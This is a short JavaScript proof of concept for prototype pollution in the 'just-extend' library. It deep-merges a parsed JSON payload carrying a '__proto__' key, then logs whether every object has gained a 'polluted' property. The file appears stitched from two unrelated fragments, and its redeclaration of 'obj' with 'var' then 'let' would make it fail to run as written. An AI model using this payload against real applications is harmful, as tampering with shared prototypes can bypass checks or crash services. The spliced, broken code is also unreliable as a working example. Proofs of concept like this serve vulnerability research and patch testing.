var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const extend = require('just-extend');
let obj = {};
console.log({}.polluted);
let payload2 = JSON.parse('{"__proto__": {"polluted": "yes"}}');
extend(true, obj, payload2);
console.log({}.polluted);